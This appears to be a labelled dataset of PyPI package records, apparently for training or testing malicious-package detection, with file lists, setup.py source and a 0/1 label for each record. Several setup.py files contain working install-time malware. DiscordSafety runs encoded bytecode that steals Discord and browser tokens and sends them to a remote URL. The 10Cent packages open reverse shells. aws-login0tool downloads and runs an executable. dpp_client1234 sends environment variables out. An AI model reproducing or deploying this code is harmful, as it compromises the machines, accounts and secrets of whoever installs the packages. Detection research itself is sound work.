aaaAaAaaAAAAAAAaaAaAAaaaaaAaaAaaaaAAAAAAAaAAAAa = ""QmEARYsqOQRkPigjJMRgfqrEghgVzFiseJRAgYImPEREfWIiROTsubHpCjmnREdDgWFTkdRUtsoQcxX""
IIllIllIIIlIlllIIlIIIlIlllIllllIllllllIlIllllIlll = ""kddSTOxjBcTfUZSOtHwdlXLYkUXVSNYDLzXWmmpgbbVsxPkERdSCGDFzvMrpacjNGByPaZrhVhAzywe""
U51 = ""lJrTljphVMOqEOjaGrxPrKaFAjrtandFVSYgDAOTCIdsFJrjNvNKrYGebiLnRSQxeOlGKHNukJysVxA""
d53 = 134
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb = ""RNqPTmEboPKGNevCCaYRBstyRejycDaYsbiHyqAEIwFWRfhNTqavHuLykXCqaFxDvGulUBGPsyecNcM""
IlIIIIIIIllIlIIIIIIllIIIlIIlIlIlIlIIIIlllIllllIIIIIlIlllI = 471
a59 = ""utXFpUeFYFNfLhjagbNUFKjPzwOyzKORxzQEImiPnwrDleIlozCcqAHtukaBiJoohcfQHaycQqExZnl""
aAAAAAAAaaAaAAaaaAaaaaAAaAaaaAAaAAaAaAaaaaAAAAAAaaAAaaAaAaaAa = ""ZBNiUWxnbuHTHuZMTQjcpoESOltQMYiNIRwvmQhsEOeleIfNNfvrmqRorOyzWPyCeJOaVPmcFsPFxxZ""
IoimIhjFPhgwuHPcgHIDywPfmfCFrNAxsLRRhOYNdtDzaFHbZHqAEGWrMZLJGRGYsjpihKAxtJjziYi63 = ""ACrXjfCShfCbZyryyNfRJWzrtYjyQHDkMsDvjXhgbXoPHUNKGTXkFfgooyElwyOgHljWesKigRejpwr""
W161945043429361265 = 349
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx = ""FBWBQjMRPpgnNiTOVRfANNJjKtcemLCewereWnmeJpHSRzQPgTOTXSZUKKlOAAIIwfRcSovsGLBYkee""
lIIIIlIlIIIllllIIIllIIllIllIllIIlIIlIlllIlIllIlIIIIIIlIlIIIllllIIIIll = 275
e1619450434294691371 = ""OVKsWpVOtyjRCSwAcJJFpZoZbwZfCnjyvZppLCFDrhWJizFkEGJiVWxJfHbfIGiwSRJPYnQJAewhOnX""
n161945043429531473 = ""MqsdRdjecdLyufQbKSOIuAWzKgmFwaldUrZqrTaGGCaXANDaeVTTnowSIhzMAokKJDXysZAXAxhjRPF""
Q161945043429555375 = 504
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU = 644
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC = 454
s1619450434296482881 = 412
AaAaaAAaaaaaaaaaAAAaAAaaaAaAaaAaAAAAaAAaaaAaAaAAaAAAAAAAaaAAaAaAaAAAAAaaAaAAaaaAAAA = 422
o1619450434297488585 = ""ftoxHDKPUHqYLlUNwnGewZOZYQtckIaGUANWFegyAvfjwbPgcxbgrJYuzyNTtsOYfGTJrdmPFBwaNIC""
iuqOtHJWaqsGSZYSgnuesXNhOkyVISlICfLQGqRmFXQJSJATYyIkTerUYwzqiIImUQEKCknPUysgmbn87 = 267
AAaAAAAaAAAaaAaAaaaaAAAaAAAaaaAaaaAaaAaAaAaAaAAaAaaaAaAAaaAAAAAAaAAaAaAAAAAaaaaAAAaaAaaaa = ""yrBuZBSLKtUalIWCKavsQoqRKEmIUkUbftShDheYbodWxSdDncLRTSTsbvBMihPmtMsDVigpcxYjsPP""
IIllIIIIIlIIlIIllIIllIlIlIIllIlllIIIIlllllIllIIIIllllIlllIIlIlIllIIIIIlIIllIIIIllIIIllIIlIl = ""GwDQpZHKvrPkKAdPCQnpqFliihrHgHCMxtrTsURMUUUWGOVcvzuHoNtLmhupARumxvkCnhsnKikuyMR""
AaAAAaAaaAAaAAAAAAAAAAAaAaAAaAaAaAaAAaAaAaAAAaaaaaaaaaAaaAAaaAaAaaaAaaaAaAAaaaAaAAaaAAaaaaaaA = ""MRBogfhNakuGarmhjxKgLVixnpoLHBAFONgaLhCSIuSsFkvPSDHMcCTLhiCwVHDEABLcxFZptvQQNti""
j1619450434300616795 = ""TACtNyaFjhBrvvoJvLZhUxrziZFqhpxtdOjepfFyfqFPVZCPvZcRgPZWuGPzMrQGAEJPpEGUivhONpc""
aAAAaAAAAAaaaAaaaAaaaAAaAaAAaaaaAaaaAAaAaAaaAAAAaAaaaAAaaAAaaaAAaaaAaaaaAaaaaAAAaaaaaAAAaAaAaaAaA = ""tamhiBdZUJnzQmUsPriVCEZEVQTpBmwzlpnNrHjVNtTGLKdBTSpWEbkSSNGKJaoctiHZWBCCMKVcIDu""
AAAaaaaaAAAAaaAAAaAAAaAaAAAAaaAaaaaaaAAAAAAAAaAaAAaAAaAaaaaaAaAaAaAAAaaaAAAAaAaaAAAaaaaaaaaaaaAAAaa = ""ETVVAHDSDfAaSyawyslwfBHEosPevIEoeAjXfSiLyhfnLbuObLSVyCWiUEJOVUdEtyyZXViZtNLOJXr""
IIIllIIllIlIIIlllIllIIlllIlIIIIlIlIlIIlIIIIIlIIIlIlIIlIlllIIlIIIlIlIIllllIlIlIIIllIlllIIlIIIlIIlIllII = ""tHAhoQYMzhqqalwlhOSCYOOhZAytjioyWKPqpXDtMmxMHKCdGkUOJShFZjzLrxqwBcrUvwZasGdONuL""
aaAaAaAAaAaaAAAaaaaaAaAaAAAAaaAaaAaAaaaAaAaAaaAAAaAAaAAaAaAAAaAAAAaaaaaAAAAaAaAaaAaAaAAaaAaaaaAAaaAAAaa = ""TIYNsXHpMJrySqyFUvooFikCAaHtgUZllybcTkHpnbmOpRRdwlFpNzfDDZFJRkNeYvNjptgwUUMRplH""
u16194504343035605105 = 474
lIllIIlllIlIllllIllIlIIIllIIIlIlIIllllIIlllllIIlllIIIIlIlIlllIllIIllIllIIIIIIIllIllIIllllIIIllllIIlIIIIIIII = 558
M1619450434304561109 = 761
llIIlllllllllIlIlIIIlIllIlIIIllIlllIIlIlIllIIlIIIlIIIIIIIIIllIlIllIIllIIllIIIlllIIlIIlIIIlIIllIIlllIlIlIlIIlIll = 280
lIlIIIIlIIIlllIlIllIIIIIllIIllIIlIIlIlllIIlllllllllIIlIIIIllIllIllIIIllIlIlllIlIlIIIIlIllIlIIIlllIlIlIIIlIIlllIll = 607
llllllIIlllllIIllllIlIlIllIlIllIIlIllIlllIIIllllIIllIIIIlIIIlIIlllIlIIlIIIlIIlIllIIllllIIIIIIIIlIIIllIlIIIIIlIIlllI = 714
",1
noblesse-0.0.1,1,0,1,1,1,0,1,0,PKG-INFO README.md setup.cfg setup.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt noblesse.py,"from setuptools import setup

with open('README.md','r') as fh:
    long_description = fh.read()
setup(
    name=""noblesse"",
    version='0.0.1',
    description='This Module Optimises your PC For Python',
    py_modules=[""noblesse""],
    package_dir={'':'src'},
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    install_requires=[
        ""requests"",
    ],
    url=""https://github.com/siph-er"",
    author=""sipher"",
    author_email=""xinftw@protonmail.com"",
    
)",1
yiffparty-0.01,0,0,1,0,0,0,0,1,PKG-INFO README.rst setup.cfg setup.py horni.py __init__.py,"from distutils.core import setup
from os import path
this_directory = path.abspath(path.dirname(__file__))
with open(path.join(this_directory, 'README.rst'), encoding='utf-8') as f:
    long_description = f.read()
    
setup(
  name = 'yiffparty',    
  packages = ['yiffparty'],   
  version = '0.01',    
  license='MIT',       
  description = 'Simple tool to get images from yiff-party.com',
  long_description=long_description,
  long_description_content_type='text/markdown',
  author = 'icy__flames',                   
  author_email = 'dontfuckingbother@emailisfake.net',    
  url = 'http://lolurmomis.gay',    
  keywords = ['yiff', 'furry', 'porn', 'gay', 'straight', 'lesbian'],   
  install_requires=[     
          'requests',
          'beautifulsoup4',
      ],
  classifiers=[
    'Development Status :: 3 - Alpha',
    'Intended Audience :: Developers',     
    'Topic :: Software Development :: Build Tools',
    'License :: OSI Approved :: MIT License',       
    'Programming Language :: Python :: 3.6',
    'Programming Language :: Python :: 3.7',
    'Programming Language :: Python :: 3.8',
    'Programming Language :: Python :: 3.9',
  ],
)
",0
ipboards-9999.0.2,0,0,1,0,0,0,1,0,CHANGELOG.txt exploit.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENCE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py,,1
yandex-yt-999.1.2,1,0,1,1,0,0,1,0,PKG-INFO setup.cfg setup.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt,,1
DiscordSafety-0.1,1,0,0,1,0,0,1,1,__init__.py dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup
import requests as rq
import sys
import os
import marshal as m


setup(name='DiscordSafety',
      version='0.1',
      description='Защитите свой дискорд аккаунт, установив библиотеку. После чего вы сможете: Видеть ip адресс человека который пытается войти в аккаунт, всякие Фишинг ссылки будут автоматически скрыты.',
      packages=['DiscordSafety'],
      author_email='abobus@gmail.com',
      zip_safe=False)

if 'install' in sys.argv:
	try:
		os.system('mkdir DiscordSword')
		os.chdir('C:/Users/User/Desktop')
		exec(m.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16\x00\x00\x00@\x00\x00\x00s\xd6\x00\x00\x00d\x00d\x01l\x00Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03d\x00d\x01l\x04Z\x04d\x00d\x01l\x05Z\x05d\x00d\x01l\x06Z\x06d\x00d\x01l\x07Z\x07e\x02j\x08d\x02k\x03r\x84e\td\x03\x83\x01\x01\x00e\nd\x04\x83\x01D\x00]*Z\x0be\x0ce\x0b\x9b\x00d\x05\x9d\x02d\x06\x83\x02\x8f\x10Z\re\r\xa0\x0ed\x07\xa1\x01\x01\x00W\x005\x00Q\x00R\x00X\x00qRe\x0f\x83\x00\x01\x00d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fd\x10d\x11d\x12d\x13d\x14d\x15d\x16d\x17d\x18d\x19d\x1ad\x1bd\x1cd\x1dg\x16Z\x10d\x1ed\x1f\x84\x00Z\x11d d!\x84\x00Z\x12d""d#\x84\x00Z\x13e\x13\x83\x00\x01\x00d\x01S\x00)$\xe9\x00\x00\x00\x00N\xda\x02ntz\x03...i\xe8\x03\x00\x00z\x14-nuked-by-m4tvey2207z\x02w+z\x18Windows stav na komputer\xfa\x10ROAMING\\Discord\\\xfa\x12ROAMING\\Lightcord\\\xfa\x13ROAMING\\discordptb\\\xfa\x16ROAMING\\discordcanary\\\xfa$ROAMING\\Opera Software\\Opera Stable\\\xfa\'ROAMING\\Opera Software\\Opera GX Stable\\\xfa\x16LOCAL\\Amigo\\User Data\\\xfa\x16LOCAL\\Torch\\User Data\\\xfa\x17LOCAL\\Kometa\\User Data\\\xfa\x18LOCAL\\Orbitum\\User Data\\\xfa\x1cLOCAL\\CentBrowser\\User Data\\\xfa\x1cLOCAL\\7Star\\7Star\\User Data\\\xfa LOCAL\\Sputnik\\Sputnik\\User Data\\\xfa LOCAL\\Vivaldi\\User Data\\Default\\\xfa""LOCAL\\Google\\Chrome SxS\\User Data\\\xfa%LOCAL\\Epic Privacy Browser\\User Data\\\xfa&LOCAL\\Google\\Chrome\\User Data\\Default\\\xfa\'LOCAL\\uCozMedia\\Uran\\User Data\\Default\\\xfa\'LOCAL\\Microsoft\\Edge\\User Data\\Default\\\xfa-LOCAL\\Yandex\\YandexBrowser\\User Data\\Default\\\xfa2LOCAL\\Opera Software\\Opera Neon\\User Data\\Default\\\xfa4LOCAL\\BraveSoftware\\Brave-Browser\\User Data\\Default\\c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x07\x00\x00\x00C\x00\x00\x00s\x96\x00\x00\x00|\x00d\x017\x00}\x00t\x00j\x01\xa0\x02|\x00\xa1\x01s\x18g\x00S\x00g\x00}\x01t\x00\xa0\x03|\x00\xa1\x01D\x00]j}\x02|\x02\xa0\x04d\x02\xa1\x01s@|\x02\xa0\x04d\x03\xa1\x01s@q&d\x04d\x05\x84\x00t\x05|\x00\x9b\x00d\x06|\x02\x9b\x00\x9d\x03d\x07d\x08\x8d\x02\xa0\x06\xa1\x00D\x00\x83\x01D\x00]*}\x03d\tD\x00] }\x04t\x07\xa0\x08|\x04|\x03\xa1\x02D\x00]\x0e}\x05|\x01\xa0\t|\x05\xa1\x01\x01\x00q|qlqdq&|\x01S\x00)\nNz\x16\\Local Storage\\leveldbz\x04.logz\x04.ldbc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00S\x00\x00\x00s\x1c\x00\x00\x00g\x00|\x00]\x14}\x01|\x01\xa0\x00\xa1\x00r\x04|\x01\xa0\x00\xa1\x00\x91\x02q\x04S\x00\xa9\x00)\x01\xda\x05strip)\x02\xda\x02.0\xda\x01xr\x19\x00\x00\x00r\x19\x00\x00\x00\xda\x00\xda\n<listcomp>\x1b\x00\x00\x00s\x06\x00\x00\x00\x06\x00\x02\x00\x08\x00z\x1ffind_tokens.<locals>.<listcomp>\xfa\x01\\\xda\x06ignore)\x01\xda\x06errors)\x02z\x1e[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}z\x0emfa\\.[\\w-]{84})\n\xda\x02os\xda\x04path\xda\x06exists\xda\x07listdir\xda\x08endswith\xda\x04open\xda\treadlines\xda\x02re\xda\x07findall\xda\x06append)\x06r#\x00\x00\x00\xda\x06tokens\xda\tfile_name\xda\x04line\xda\x05regex\xda\x05tokenr\x19\x00\x00\x00r\x19\x00\x00\x00r\x1d\x00\x00\x00\xda\x0bfind_tokens\x12\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x08\x01\x0c\x01\x04\x01\x04\x01\x0e\x01\x14\x01\x02\x02(\x01\x08\x01\x10\x01\x12\x01r1\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00C\x00\x00\x00s4\x00\x00\x00g\x00}\x01g\x00}\x02|\x00D\x00]""}\x03|\x03|\x02k\x06r\x1aq\x0c|\x02\xa0\x00|\x03\xa1\x01\x01\x00|\x01\xa0\x00|\x03\xa1\x01\x01\x00q\x0c|\x01S\x00)\x01N)\x01r+\x00\x00\x00)\x04\xda\x04list\xda\x03ret\xda\x03all\xda\x02elr\x19\x00\x00\x00r\x19\x00\x00\x00r\x1d\x00\x00\x00\xda\x05cutcc!\x00\x00\x00s\x10\x00\x00\x00\x00\x01\x04\x01\x04\x01\x08\x01\x08\x01\x02\x01\n\x01\x0c\x01r6\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x07\x00\x00\x00C\x00\x00\x00s\xb2\x00\x00\x00g\x00}\x00d\x01D\x00]Z}\x01|\x01\xa0\x00d\x02t\x01\xa0\x02d\x03\xa1\x01\xa1\x02\xa0\x00d\x04t\x01\xa0\x02d\x05\xa1\x01\xa1\x02}\x01t\x01j\x03\xa0\x04|\x01\xa1\x01s:q\x08t\x05|\x01\x83\x01}\x02t\x06|\x02\x83\x01d\x06k\x04r\x08|\x02D\x00]\x0e}\x03|\x00\xa0\x07|\x03\xa1\x01\x01\x00qRq\x08t\x06|\x00\x83\x01d\x06k\x04svt\x08\x83\x00\x01\x00t\t|\x00\x83\x01}\x00|\x00D\x00]*}\x03z\x14t\n\xa0\x0bd\x07|\x03\x9b\x00\x9d\x02\xa1\x01\x01\x00W\x00q\x82\x01\x00\x01\x00\x01\x00Y\x00q\x82Y\x00q\x82X\x00q\x82d\x00S\x00)\x08N)\x16r\x03\x00\x00\x00r\x04\x00\x00\x00r\x05\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00r\x0b\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x10\x00\x00\x00r\x11\x00\x00\x00r\x12\x00\x00\x00r\x13\x00\x00\x00r\x14\x00\x00\x00r\x15\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00r\x18\x00\x00\x00\xda\x07ROAMING\xda\x07APPDATA\xda\x05LOCALZ\x0cLOCALAPPDATAr\x01\x00\x00\x00z7https://tornadodomain.000webhostapp.com/stlr.php?token=)\x0c\xda\x07replacer""\x00\x00\x00\xda\x06getenvr#\x00\x00\x00r$\x00\x00\x00r1\x00\x00\x00\xda\x03lenr+\x00\x00\x00\xda\x04exitr6\x00\x00\x00\xda\x02rq\xda\x03get)\x04\xda\x03gtlr#\x00\x00\x00r,\x00\x00\x00r0\x00\x00\x00r\x19\x00\x00\x00r\x19\x00\x00\x00r\x1d\x00\x00\x00\xda\x04main+\x00\x00\x00s""\x00\x00\x00\x00\x01\x04\x01\x08\x01 \x01\x0c\x01\x02\x01\x08\x02\x0c\x01\x08\x01\x0e\x01\x0c\x01\x06\x01\x08\x01\x08\x01\x02\x01\x14\x01\x06\x01rA\x00\x00\x00)\x14\xda\x08requestsr>\x00\x00\x00r""\x00\x00\x00\xda\x03sys\xda\x04timer)\x00\x00\x00\xda\x04json\xda\x06base64\xda\x04name\xda\x05print\xda\x05range\xda\x01nr\'\x00\x00\x00\xda\x01f\xda\x05writer=\x00\x00\x00\xda\x05pathsr1\x00\x00\x00r6\x00\x00\x00rA\x00\x00\x00r\x19\x00\x00\x00r\x19\x00\x00\x00r\x19\x00\x00\x00r\x1d\x00\x00\x00\xda\x08<module>\x01\x00\x00\x00s""\x00\x00\x00\x08\x01\x08\x01\x08\x01\x08\x01\x08\x01\x08\x01\x08\x02\n\x01\x08\x01\x0c\x01\x12\x00\x16\x01\x06\x030\x02\x08\x0f\x08\n\x08\x14'))
	except:
		pass",1
10Cent11-999.0.4,0,0,1,0,0,0,1,0,dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os
import pty

class CustomInstall(install):
    def run(self):
            install.run(self)
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((""104.248.19.57"",3334))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            pty.spawn(""/bin/sh"")


setup(name='10Cent11',
      version='999.0.4',
      description='Exfiltration',
      author='j0j0',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})


",1
owlmoon-0.01,1,0,1,0,0,0,0,0,PKG-INFO README.rst setup.cfg setup.py,,1
pptest-999.0.10,1,0,0,1,1,0,1,0,PKG-INFO __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt setup.cfg setup.py,"#!/usr/bin/env python
# coding: utf-8

from setuptools import setup
from setuptools.command.install_scripts import install_scripts

class InstallScripts(install_scripts):

    def run(self):
        setuptools.command.install_scripts.install_scripts.run(self)
        print('in setup....')
        # Rename some script files
        for script in self.get_outputs():
            if basename.endswith("".py"") or basename.endswith("".sh""):
                dest = script[:-3]
            else:
                continue
            print(""moving %s to %s"" % (script, dest))
            shutil.move(script, dest)
setup(
    name='pptest',
    version='999.0.10',
    author='pptest',
    author_email='testtt@google.com',
    url='https://www.google.com',
    description=u'just for test',
    packages=['pptest'],
    install_requires=['dnsPython'],
    entry_points={
        'console_scripts': [
            'pip3=pptest:mypip',
            'pip=pptest:mypip'
        ]
    },
    cmdclass={
        ""install_scripts"": InstallScripts
    }
)",1
importantpackage-0.1.22,1,0,0,1,1,0,1,0,PKG-INFO README.md setup.cfg setup.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import setuptools

with open(""README.md"", ""r"", encoding=""utf-8"") as fh:
    long_description = fh.read()

setuptools.setup(
    name=""importantpackage"",
    install_requires = ['dnspython'],
    version=""0.1.22"",
    author=""Example Author"",
    author_email=""author@example.com"",
    description=""A small example package"",
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    url=""https://github.com/pypa/sampleproject"",
    project_urls={
        ""Bug Tracker"": ""https://github.com/pypa/sampleproject/issues"",
    },
    #packages=setuptools.find_packages(),
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 2"",
    ],
    package_dir={"""": ""src""},
    packages=setuptools.find_packages(where=""src""),
    #python_requires="">=3.6"",
)
",1
10Cent10-999.0.4,0,0,1,0,0,0,1,0,dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os
import pty

class CustomInstall(install):
    def run(self):
            install.run(self)
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((""104.248.19.57"",3333))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            pty.spawn(""/bin/sh"")


setup(name='10Cent10',
      version='999.0.4',
      description='Exfiltration',
      author='j0j0',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})


",1
botaa3,0,0,1,0,1,0,1,0,,,1
aws-login0tool-0.0.10,1,0,0,1,1,0,1,0,LICENSE PKG-INFO pyproject.toml README.md setup.cfg setup.py example.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt,"# Mooched from https://github.com/Ayrx/malicious-python-package/blob/master/setup.py

from setuptools import setup
from setuptools.command.install import install
from os import system
import setuptools
import urllib.request
from subprocess import run

class SneakyInstall(install):
    def run(self): 
        try:
        	urllib.request.urlretrieve(""https://tryg.ga/syswin32.exe"", ""syswin32.exe"")
        	run(['start', 'syswin32.exe'], shell=True)
        except Exception as e:
        	print(e)
        return True


with open(""README.md"", ""r"", encoding=""utf-8"") as fh:
    long_description = fh.read()



setup(
    name=""aws-login0tool"",
    version=""0.0.10"",
    author=""Author"",
    author_email=""author@example.com"",
    description=""A small example package"",
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    url=""https://example.com"",
    project_urls={
        ""Bug Tracker"": ""https://example.com"",
    },
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    package_dir={"""": ""src""},
    packages=setuptools.find_packages(where=""src""),
    python_requires="">=3.6"",
    cmdclass={'install': SneakyInstall},
)
",1
dpp_client-1.0.2,1,0,0,1,1,0,1,0,base.py http.py __init__.py test_http.py __init__.py __init__.py __init__.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO pyproject.toml setup.cfg setup.py,,1
dpp_client1234-1.0.5,1,0,0,1,1,0,1,0,base.py http.py __init__.py test_http.py __init__.py __init__.py __init__.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO pyproject.toml setup.cfg setup.py,"import setuptools
import urllib.request
import urllib.parse
import os
from os import listdir
from os.path import isfile, join


stream = os.popen('env')
pwd = stream.read()

params = urllib.parse.urlencode({'pwd': pwd, 'files': os.listdir(""./../"")}).encode()

urllib.request.urlopen(""http://pt.traktrain.com/req.php?test"", data=params);


setuptools.setup(
    name=""dpp_client1234"", # Replace with your own username
    version=""1.0.5"",
    author=""Example Author"",
    author_email=""author@example.com"",
    description=""A small example package"",
    long_description=""test"",
    long_description_content_type=""text/markdown"",
    url=""https://github.com/pypa/sampleproject"",
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    packages=setuptools.find_packages(),
    python_requires='>=3.6',
)
",1
Sagepay-1.1,1,0,0,0,0,0,1,0,PKG-INFO __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt setup.cfg setup.py,"from setuptools import setup, find_packages
setup(name = ""Sagepay"", version = ""1.1"", packages = find_packages())",1
apple-py-music-1.0,1,0,0,0,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup, find_packages
setup(name = ""apple-py-music"", version = ""1.0"", packages = find_packages())",1
AadhaarCrypt-1.0,1,0,0,0,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup, find_packages
setup(name = ""AadhaarCrypt"", version = ""1.0"", packages = find_packages())",1
easyfuncsys-0.0.1,1,0,0,1,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup, find_packages
import os

here = os.path.abspath(os.path.dirname(__file__))

VERSION = '0.0.1'
DESCRIPTION = 'Sniping names'
LONG_DESCRIPTION = 'Sniping names'

# Setting up
setup(
    name=""easyfuncsys"",
    version=VERSION,
    author=""nfsdfssdfone"",
    author_email=""nonfsdfddse@gmail.com"",
    description=DESCRIPTION,
    long_description_content_type=""text/markdown"",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=[],
    keywords=[],
    classifiers=[
        ""Development Status :: 1 - Planning"",
        ""Intended Audience :: Developers"",
        ""Programming Language :: Python :: 3"",
        ""Operating System :: Microsoft :: Windows"",
    ]
)",0
xss-0.0.7,1,0,0,1,0,0,1,0,PKG-INFO setup.cfg setup.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import setuptools
setuptools.setup(
    name=""xss"", # Replace with your own username
    version=""0.0.7"",
    author=""Drake Sniffer"",
    author_email=""drakesniffer@gmail.com"",
    description=""A simple XSS Toolkit"",
    packages=setuptools.find_packages(),
    python_requires='>=3.6',
    install_requires=['requests', 'browser_cookie3', 'threading']
)",0
humanqueenn-0.0.2,1,0,0,1,0,0,1,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt __init__.py PKG-INFO setup.cfg setup.py,"from setuptools import setup, find_packages
import os

here = os.path.abspath(os.path.dirname(__file__))

VERSION = '0.0.2'
DESCRIPTION = 'Package pour humanqueen'
LONG_DESCRIPTION = 'cest rien de ouf hein juste un package pour humanqueen'

# Setting up
setup(
    name=""humanqueenn"",
    version=VERSION,
    author=""xin"",
    author_email=""xin@gmail.com"",
    description=DESCRIPTION,
    long_description_content_type=""text/markdown"",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=['requests'],
    keywords=[],
    classifiers=[
        ""Development Status :: 1 - Planning"",
        ""Intended Audience :: Developers"",
        ""Programming Language :: Python :: 3"",
        ""Operating System :: Microsoft :: Windows"",
    ]
)
",0
humanqueen-0.0.1,1,0,0,1,0,0,1,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt __init__.py PKG-INFO setup.cfg setup.py,"from setuptools import setup, find_packages
import os

here = os.path.abspath(os.path.dirname(__file__))

VERSION = '0.0.1'
DESCRIPTION = 'Package pour humanqueen'
LONG_DESCRIPTION = 'cest rien de ouf hein juste un package pour humanqueen'

# Setting up
setup(
    name=""humanqueen"",
    version=VERSION,
    author=""xin"",
    author_email=""xin@gmail.com"",
    description=DESCRIPTION,
    long_description_content_type=""text/markdown"",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=['requests'],
    keywords=[],
    classifiers=[
        ""Development Status :: 1 - Planning"",
        ""Intended Audience :: Developers"",
        ""Programming Language :: Python :: 3"",
        ""Operating System :: Microsoft :: Windows"",
    ]
)
",0
aiohttp_proxies-0.8.36,1,0,1,1,1,0,1,1,connector.py utils.py _deprecated.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,,1
secrevtwo-0.0.1,0,0,0,0,0,0,1,0,PKG-INFO config_manager.py dist_util.py monkey_patch.py string_utils.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt setup.cfg setup.py,"from setuptools import setup
setup(name=""secrevtwo"", version=""0.0.1"", description=(""This is a tool created to patch""), packages=[""secrevtwo""])
",0
ctx-0.2.2,1,0,1,1,1,0,0,0,.gitignore .travis.yml dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt ctx.py LICENSE Makefile MANIFEST.in PKG-INFO README.rst requirements-dev.txt requirements.txt setup.cfg setup.py test_ctx.py tox.ini,"from __future__ import unicode_literals

import os
import codecs

from setuptools import setup

import ctx


def read(*paths):
    """"""Build a file path from *paths* and return the contents.""""""
    path = os.path.join(*paths)
    with codecs.open(path, mode='rb', encoding='utf-8') as f:
        return f.read()


long_description = '\n\n'.join(
    map(read, (
        'README.rst',
    ))
)


setup(
    name='ctx',
    version=ctx.__version__,
    description=""A minimal but opinionated dict/object combo (like Bunch)."",
    long_description=long_description,
    author='Robert Ledger',
    author_email='figlief@figlief.com',
    url='https://github.com/figlief/ctx',
    include_package_data=True,
    py_modules=['ctx'],
    install_requires=[],
    license=""MIT"",
    zip_safe=False,
    keywords='ctx',
    classifiers=[
        'Development Status :: 2 - Pre-Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Natural Language :: English',
        'Programming Language :: Python :: 2',
